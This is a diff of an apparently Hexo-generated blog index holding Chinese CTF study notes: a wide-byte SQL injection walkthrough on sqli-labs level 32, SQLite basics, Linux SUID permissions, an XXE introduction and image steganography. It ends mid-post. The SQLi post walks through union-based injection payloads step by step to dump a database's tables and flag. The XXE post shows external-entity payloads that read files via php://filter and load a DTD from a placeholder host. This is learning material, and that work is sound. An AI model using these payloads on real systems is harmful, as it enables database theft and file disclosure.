+<p>也可以这样查</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="在这里插入图片描述"><br>这样就找到flag了</p>
+]]></content>
+      <categories>
+        <category>web学习</category>
       </categories>
   </entry>
   <entry>
@@ -839,40 +873,6 @@
       </tags>
   </entry>
   <entry>
-    <title>宽字节注入</title>
-    <url>/2021/05/18/kuan/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-
-<h1 id="一、什么是宽字节注入？"><a href="#一、什么是宽字节注入？" class="headerlink" title="一、什么是宽字节注入？"></a>一、什么是宽字节注入？</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
-<p>sqli-labs 第32关(没有搭建的话可以去<a href="https://buuoj.cn/challenges#sqli-labs">buuctf找basic中的sqli-labs</a>)[这个可以配合理解，自行操作效果极佳]</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="在这里插入图片描述"><br>随便输个id<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="在这里插入图片描述"><br>尝试用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="在这里插入图片描述"><br>发现‘ ‘ ’(单引号)转变成了‘ \‘ ’(反斜杠+单引号)<br>那就结合今天所学知识进行操作<br>首先利用order by 语句进行查询</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="在这里插入图片描述"><br>3的话出现报错说明只有2个字段</p>
-<p>接着利用union select语句查询数据库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="在这里插入图片描述"><br>有了数据库名之后接着往下查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="在这里插入图片描述"><br>接着查ctf4（其余几个有兴趣也可以查一下看看，给出ctf4是因为里边有flag）</p>
-<p>这里给ctf4转为了16进制（记得在前边加上0x）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="在这里插入图片描述"><br>看到了flag<br>继续查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
-<p>也可以这样查</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="在这里插入图片描述"><br>这样就找到flag了</p>
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-  </entry>
-  <entry>
     <title>rarctf</title>
     <url>/2021/08/11/rarctf/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
@@ -906,6 +906,153 @@
       <categories>
         <category>比赛复现</category>
       </categories>
+  </entry>
+  <entry>
+    <title>rsa</title>
+    <url>/2021/08/20/rsa/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+]]></content>
+      <categories>
+        <category>crypto</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sqlite注入学习</title>
+    <url>/2021/08/19/sqlite/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+<h1 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h1><p>sqlite的每一个数据库就是一个文件。</p>
+<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite3 test.db</span><br></pre></td></tr></table></figure>
+
+<p>命令执行后就会再当前目录下生成对应名称的文件，之后的数据操作都是对该文件的操作。成功创建数据库文件之后，会出现👇</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SQLite version 3.27.2 2019-02-25 16:06:06</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta">sqlite&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库成功创建后可以使用 SQLite 的 .databases 命令来检查它是否在数据库列表中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .database</span><br><span class="line">main: </span><br></pre></td></tr></table></figure>
+
+<p>打开数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line">sqlite&gt; .open sqltest.db</span><br></pre></td></tr></table></figure>
+
+<p>导入和导出数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导出</span><br><span class="line">$sqlite3 testDB.db .dump &gt; testDB.sql</span><br><span class="line"># 导入</span><br><span class="line">$sqlite3 testDB.db &lt; testDB.sql</span><br></pre></td></tr></table></figure>
+
+<p>创建表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; create table test(</span><br><span class="line">   ...&gt; id INT PRIMARY KEY     NOT NULL,</span><br><span class="line">   ...&gt; name char(50) NOT NULL</span><br><span class="line">   ...&gt; );</span><br><span class="line">   </span><br><span class="line">sqlite&gt; CREATE TABLE COMPANY(</span><br><span class="line">   ID INT PRIMARY KEY     NOT NULL,</span><br><span class="line">   NAME           TEXT    NOT NULL,</span><br><span class="line">   AGE            INT     NOT NULL,</span><br><span class="line">   ADDRESS        CHAR(50),</span><br><span class="line">   SALARY         REAL</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>提权</title>
+    <url>/2021/08/03/suid%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+<h3 id="Linux权限介绍"><a href="#Linux权限介绍" class="headerlink" title="Linux权限介绍"></a>Linux权限介绍</h3><h4 id="文件的基本权限"><a href="#文件的基本权限" class="headerlink" title="文件的基本权限"></a>文件的基本权限</h4><p>可以使用<code>ll</code>或<code>ls -l</code>来查看linux下的文件权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-rw------- 1 hack hack 384000  6月  2 16:29 789.png</span><br><span class="line">drwxr-xr-x 2 hack hack   4096  6月  2 17:42 examples</span><br><span class="line">-rw------- 1 hack hack   4564  7月  9 11:11 file.png</span><br><span class="line">-rwxrw-rw- 1 hack hack  35141  8月 13  2019 LICENSE</span><br><span class="line">-rw-r--r-- 1 hack hack   4564  7月  9 11:23 output.png</span><br><span class="line">-rwxrw-rw- 1 hack hack  22668  8月 13  2019 PCRT.py</span><br><span class="line">-rwxrw-rw- 1 hack hack   7300  8月 13  2019 README.md</span><br></pre></td></tr></table></figure>
+
+<p>文件列表对应的信息分别为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。</p>
+<h5 id="文件类型分类"><a href="#文件类型分类" class="headerlink" title="文件类型分类"></a>文件类型分类</h5><p>Linux一共有7种文件类型（在文件权限前，占一个字符）：</p>
+<ul>
+<li>-：普通文件</li>
+<li>d：目录文件</li>
+<li>l：软链接（类似快捷方式）</li>
+<li>b：块设备文件（如硬盘、光驱等）</li>
+<li>p：管道文件</li>
+<li>c：字符设备文件（如猫等串口设备）</li>
+<li>s：套接口文件/数据接口文件（例如启动一个MySQL服务器时会产生一个mysql.sock文件）</li>
+</ul>
+<h5 id="文件权限分类："><a href="#文件权限分类：" class="headerlink" title="文件权限分类："></a>文件权限分类：</h5><table>
+<thead>
+<tr>
+<th>权限</th>
+<th>对应数字</th>
+<th>对文件</th>
+<th>对目录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>r</td>
+<td>4</td>
+<td>可读</td>
+<td>可以查询目录下的文件(ls、ll)</td>
+</tr>
+<tr>
+<td>w</td>
+<td>2</td>
+<td>可写</td>
+<td>可<strong>增删改移</strong>该目录下的文件和目录(cp、mv、touch、rm)</td>
+</tr>
+<tr>
+<td>x</td>
+<td>1</td>
+<td>可执行</td>
+<td>可执行但不能运行，可进入目录(cd)</td>
+</tr>
+</tbody></table>
+<p><code>-rwxrw-rw- 1 hack hack   7300  8月 13  2019 README.md</code>以这个为例，第一个字符为<code>-</code>，表明是普通文件，后边紧接着是文件权限：</p>
+<ul>
+<li>rwx：第一组代表文件所有者(即U)权限，这里是root，root对该文件拥有读写执行权限；</li>
+<li>rw-：第二组代表所属组(即G)的权限，这里所属组拥有对该文件读和写的权限；</li>
+<li>rw-：第三组代表其他人(即O)的权限，这里与G的权限一样。</li>
+</ul>
+<h5 id="更改权限的命令"><a href="#更改权限的命令" class="headerlink" title="更改权限的命令"></a>更改权限的命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown命令：用来改变文件或目录的所有者和所属用户组。</span><br><span class="line">chgrp命令：用来改变文件或目录的所属的用户组。</span><br></pre></td></tr></table></figure>
+
+<p>对于文件来说，最高权限是<code>x</code>对于目录则是<code>w</code>；</p>
+<p>对于文件能否删除，首先要对目录具有执行权限，同时对文件也要有可执行权限；</p>
+<p>一般给目录赋予权限0 ，5（r-x），7（rwx），赋予1 ，4， 6都是没有意义的。</p>
+<p>Linux常用权限值：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">600（rw------）：只有root有读写权限；</span><br><span class="line">644（rw-r--r--）：只有root有读写权限；group用户和other用户只有读权限；</span><br><span class="line">755（rwxr-xr-x）：root有读、写、执行权限；group用户和other用户只有读、执行权限。</span><br></pre></td></tr></table></figure>
+
+<h4 id="默认权限"><a href="#默认权限" class="headerlink" title="默认权限"></a>默认权限</h4><p>我们在linux系统中新建一个文件或者目录，那么这个文件或目录会有一个权限，这个权限就是默认权限。这个权限就是靠umask的值来定义的。</p>
+<blockquote>
+<p>umask（权限掩码） 就是指定当前用户在建立文件或目录时候的权限默认值。当新文件被创建时，其最初的权限由文件创建掩码决定。用户每次登录系统时，umask命令都被执行， 并自动设置掩码mode来限制新文件的权限。用户可以通过再次执行umask命令来改变默认值，新的权限将会把旧的覆盖掉。</p>
+</blockquote>
+<p>可以在终端输入<code>umask</code>来查看系统中的文件默认权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost local]# umask</span><br><span class="line">0022</span><br></pre></td></tr></table></figure>
+
+<p>0022：</p>
+<p>​    第一个0：文件特殊权限 ；后边的022：文件默认权限</p>
+<p>下面创建以一个文件和目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# mkdir 321</span><br><span class="line">                                                                                                 </span><br><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# touch 1.txt</span><br><span class="line">                                                                                                 </span><br><span class="line">┌──(root💀hack)-[~/桌面/123]</span><br><span class="line">└─# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r-- 1 root root    0  8月  3 20:04 1.txt</span><br><span class="line">drwxr-xr-x 2 root root 4096  8月  3 20:04 321</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到文件默认权限是644，目录的默认权限是755</p>
+<p>文件默认权限的特点：</p>
+<p>​    1、文件默认不能建立为执行权限，必须手工赋予执行权限，所以文件的默认权限最大为666.</p>
+<p>​    2、默认权限要换算成对应的字母权限再相减而不是数字。</p>
+<p>​    3、建立文件或目录之后的默认权限，为666减去umask的值。</p>
+<p>计算方式：</p>
+<p>​    1、文件默认最大权限666，umask=022</p>
+<p>​        -rw-rw-rw- 减去 —–w–w- 等于 -rw-r–r– （644）</p>
+<p>​    2、目录默认最大权限666，umask=022</p>
+<p>​        drwxr-xr-x 减去 d—-w–w-等于 drwxr-xr-x（644）</p>
+<p>其实是字符做了一个与非运算，要想修改umask的默认值，需要去修改环境配置文件<code>/etc/profile</code></p>
+<h4 id="文件的特殊权限：SUID、SGID、SBIT"><a href="#文件的特殊权限：SUID、SGID、SBIT" class="headerlink" title="文件的特殊权限：SUID、SGID、SBIT"></a>文件的特殊权限：SUID、SGID、SBIT</h4><p>Linux下除了<code>rwx</code>外还有<code>s</code>和<code>t</code>两个特殊权限，当<code>s</code>权限出现在所有者的x权限上时就是<code>SUID</code>；出现在所有组上时，就是<code>SGID</code>;出现在其他用户上时，就是<code>SBIT</code>.</p>
+<h5 id="SUID-SET-USER-ID"><a href="#SUID-SET-USER-ID" class="headerlink" title="SUID: SET USER ID"></a>SUID: SET USER ID</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、只有具有x权限的二进制程序才能设定SUID权限;</span><br><span class="line">2、命令执行者要对该程序拥有x权限;</span><br><span class="line">3、命令执行者只在程序执行的过程中有效，即在执行该程序时才临时拥有root身份。</span><br></pre></td></tr></table></figure>
+
+<p>赋权方式：(<code>root</code>用户才能设置)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 4755 [文件名]</span><br><span class="line">chmod u+s [文件名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">取消权限</span></span><br><span class="line">chmod 755 [文件名]</span><br><span class="line">chmod u-s [文件名]</span><br></pre></td></tr></table></figure>
+
+<p>赋权时，有x权限的才能正常赋权，替代显示为s，没有x权限的不能正常赋权，替代显示为S，S表示权限不能正确使用，因为其本身就没有可执行权限。</p>
+<h5 id="SGID-Set-Group-id"><a href="#SGID-Set-Group-id" class="headerlink" title="SGID: Set Group id"></a>SGID: Set Group id</h5><p><code>SGID</code>权限同<code>SUID</code>一样，只是<code>SUID</code>作用于所有者，而<code>SGID</code>作用于所有组，<code>SGID</code>作用在二进制程序上时，执行权限的程序时此用户将继承此程序的所属组权限，作用于目录上时，此文件夹下所有用户新建文件都自动继承此目录的用户组。同样在设置<code>SGID</code>的文件后，其组权限位上的可执行权限<code>x</code>会变成<code>s</code>,如果变成了<code>S</code>，说明其组权限位上没有可执行权限，设置<code>SGID</code>无效。</p>
+<p>赋权方式：(<code>root</code>用户才能设置)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 2755 [文件名]</span><br><span class="line">chmod g+s [文件名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">取消权限</span></span><br><span class="line">chmod 755 [文件名]</span><br><span class="line">chmod g-s [文件名]</span><br></pre></td></tr></table></figure>
+
+<h5 id="SBIT-Sticky-Bit"><a href="#SBIT-Sticky-Bit" class="headerlink" title="SBIT: Sticky Bit"></a>SBIT: Sticky Bit</h5>]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>xss-haizi-me通关记录</title>
@@ -1188,151 +1335,94 @@
       </categories>
   </entry>
   <entry>
-    <title>从0开始学web(一) http篇</title>
-    <url>/2021/08/20/rsa/</url>
+    <title>XXE</title>
+    <url>/2021/07/18/xxe/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
 
-]]></content>
+<h3 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
+<h3 id="二、关于XML"><a href="#二、关于XML" class="headerlink" title="二、关于XML"></a><strong>二、关于XML</strong></h3><p><a href="https://www.runoob.com/xml/xml-intro.html">有关XML格式点这里</a></p>
+<h4 id="关于DTD"><a href="#关于DTD" class="headerlink" title="关于DTD"></a>关于DTD</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p>
+<p>一般认为有两种引用或声明方式：</p>
+<ul>
+<li>内部DTD：对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li>
+<li>外部DTD：对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li>
+</ul>
+<p><strong>内部实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;123456&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>内部参数实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-string">&quot;&lt;!ENTITY b1 &quot;</span>123456<span class="meta-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用；其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用。</p>
+<p><strong>外部实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>外部参数实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx/xml.dtd&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY b1 SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmxhZ3tmMTRnXzFzX2hlcmV9&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、XXE应用"><a href="#三、XXE应用" class="headerlink" title="三、XXE应用"></a>三、XXE应用</h3>]]></content>
       <categories>
-        <category>crypto</category>
+        <category>web漏洞</category>
       </categories>
   </entry>
   <entry>
-    <title>sqlite注入学习</title>
-    <url>/2021/08/19/sqlite/</url>
+    <title>有关图片隐写的学习</title>
+    <url>/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
     <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
 
-<h1 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h1><p>sqlite的每一个数据库就是一个文件。</p>
-<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite3 test.db</span><br></pre></td></tr></table></figure>
+<h3 id="一、附加式图片隐写"><a href="#一、附加式图片隐写" class="headerlink" title="一、附加式图片隐写"></a>一、附加式图片隐写</h3><p>这种隐写方式通常是使用某种方式在载体文件中直接附加上要被隐写的信息。</p>
+<p>在CTF中，这类图片隐写大概有两种经典方式：</p>
+<p>​        1、直接附加字符串</p>
+<p>​        2、图种形式的隐写</p>
+<h4 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h4><p>这种类型可以用strings命令来查找</p>
+<p>关于strings命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</span><br><span class="line"></span><br><span class="line">用法：strings [选项] [文件]</span><br><span class="line"> 打印 [文件] (默认为标准输入) 中可打印的字符串</span><br><span class="line"> 选项为：</span><br><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix&#x3D;&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line"></span><br><span class="line">-d --data                 Only scan the data sections in the file</span><br><span class="line">-n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">-&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">-w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">-o                        An alias for --radix&#x3D;o</span><br><span class="line">-T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">-s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">@&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">-h --help                 Display this information</span><br><span class="line">-v -V --version           Print the program&#39;s version number</span><br><span class="line">strings：支持的目标： elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 srec symbolsrec verilog tekhex binary ihex plugin</span><br></pre></td></tr></table></figure>
 
-<p>命令执行后就会再当前目录下生成对应名称的文件，之后的数据操作都是对该文件的操作。成功创建数据库文件之后，会出现👇</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SQLite version 3.27.2 2019-02-25 16:06:06</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta">sqlite&gt;</span></span><br></pre></td></tr></table></figure>
+<p>例如<code>strings 1.jpg |grep flag</code>查找1.jpg中可打印字符串中含有flag的字符串</p>
+<p>这种类型一般是将信息插到图片的尾部，少数是插到中间。</p>
+<h4 id="图种形式的隐写"><a href="#图种形式的隐写" class="headerlink" title="图种形式的隐写"></a>图种形式的隐写</h4><p>图种这是一种以图片文件为载体，通常为jpg格式的图片，然后将zip等压缩包文件附加在图片文件后面。因为操作系统识别的过程中是，从文件头标志，到文件的结束标志位，当系统识别到图片的结束标志位后，默认是不再继续识别的，所以我们在通常情况下只能看到它是只是一张图片。</p>
+<p>利用Linux中的binwalk命令即可识别此图片文件都包含了什么文件    查询命令<code>binwalk 1.jpg</code>分离命令<code>binwalk -e 1.jpg</code></p>
+<p>分离文件也可用foremost <code>foremost 1.jpg</code></p>
+<p>binwalk可以自动识别出图片中藏的zip文件以及显示出偏移，binwalk命令还可以解压zilb数据</p>
+<p>不想用命令的话可以用16进制编辑器打开图片文件，手动提取出压缩包，这就要求了要熟悉各种常见文件的文件头标识和结束标识（自行百度</p>
+<h3 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h3><p>主要介绍关于png图片的隐写，<a href="https://ctf-wiki.org/misc/picture/png/">关于png文件结构戳这里</a></p>
+<p>重点了解一下png图片文件头数据块以及png图片IDAT块，这次的隐写也是以这两个地方为基础的。</p>
+<p><strong>png图片文件头数据块（IHDR）</strong></p>
+<p>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等</p>
+<p><strong>IDAT数据块</strong></p>
+<p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是存储着图像真正的数据。因为它是可以存在多个的，所以即使我们写入一个多余的IDAT也不会多大影响肉眼对图片的观察</p>
+<h4 id="高度被修改导致的隐写"><a href="#高度被修改导致的隐写" class="headerlink" title="高度被修改导致的隐写"></a>高度被修改导致的隐写</h4><p>图片的高度，宽度的值存放于PNG图片的文件头数据块，那么我们就可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p>
+<p>辨别：图片在Windows系统下能正常显示而Linux系统不能正常显示，这时候就要考虑图片高度是否被修改了</p>
+<p>推荐一手010editor（一个16进制编辑器），可以运行图片模板，运行模板后可以轻易的找到图片的各个数据块位置及内容</p>
+<p>知道高度被修改后可以直接改大高度也可以用脚本根据crc校验值爆破出来</p>
+<p>脚本如下：</p>
